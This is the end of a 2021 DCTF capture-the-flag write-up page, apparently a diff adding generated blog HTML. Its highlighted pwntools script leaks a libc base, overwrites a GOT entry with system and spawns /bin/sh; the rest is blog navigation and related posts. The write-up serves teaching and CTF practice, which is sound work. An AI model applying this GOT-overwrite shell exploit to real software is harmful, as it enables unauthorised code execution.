+</span><span class="nf">create</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x410</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="sh">""</span><span class="p">,</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">)</span>
+<span class="c1">#pause()
+</span><span class="nf">change</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<span class="nf">relive</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">)</span>
+<span class="n">libc_base</span><span class="o">=</span><span class="nf">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span><span class="o">-</span><span class="mh">0x3ebca0</span>
+
+<span class="k">print</span> <span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
+
+<span class="nf">create</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sh">"</span><span class="s">C</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="n">libc_base</span><span class="p">,</span> <span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">strcspn</span><span class="sh">'</span><span class="p">],</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]),</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">pause</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">//bin/sh</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#ctf" class="page__taxonomy-item p-category" rel="tag">ctf</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2021-05-17T19:18:39+09:00">May 17, 2021</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=2021+dctf+write-up%20http%3A%2F%2Flocalhost%3A4000%2Fctf%2Fdctf_2021_just_another_heap%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fctf%2Fdctf_2021_just_another_heap%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/ctf/dctf_2021_just_another_heap/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="#" class="pagination--pager disabled">Previous</a>
+    
+    
+      <a href="/ctf/thcctf_2021_pwn_rev/" class="pagination--pager" title="2021 thcctf write-up
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    
+<div class="page__related">
+  
+  <h2 class="page__related-title">You may also enjoy</h2>
+  <div class="grid__wrapper">
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/ctf/htb_businessctf_2022/" rel="permalink">HTB Business CTF 2022 : Dirty Money write-up (in progress)
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          5 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Write-up IN PROGRESS ..
+작성중
+
+Summary
+Solved 3 pwn (including windows kernel exploitation), 3 crypto, 2 rev, 1 forensic. pwn focused on FSB attack or ezpz ker...</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/v8/V8-introduction/" rel="permalink">[V8 Study] 00-introduction
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">[!] 우선적으로 한글로 작성하여 추후 번역할 예정.
+
+Summary
+우리가 대중적으로 사용하는 Google Chrome browser에는 웹페이지를 동적으로 실행시키기 위해 javascript가 구동될 수 있도록 지원하고 있다. 그렇다면, JS를 원활하게 실행하고 컴파일하는 역할...</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/life/list-after-graduate/" rel="permalink">Personal R&amp;D plan beginning from ‘now’
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">UPDATED : 06 JUN 2023 19:45 UTC+9 KST
+
+This is my plan to be finished until/after graduating.
+
+Research
+
+  § must be finished until new year’s day §
+  
+    K...</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/note/web-note-update/" rel="permalink">web note (update 2021.10.27)
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          2 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">post will be frequently updated
+
+SSTI (Server Side Template Injection)
+해당 취약점은 웹 프레임워크에서 사용되는 여러 가지 Template Engine에서 발생하며, 특별한 구문을 통해 RCE를 일으킬 수도 있다.
+This v...</p>
+  </article>
+</div>
+
+    
+  </div>
+</div>
+
+  
+  
+</div>
+
+      
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';" role="search">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2024 <a href="http://localhost:4000">st4rlight</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+
+  
+
+
+
+
+  </body>
+</html>
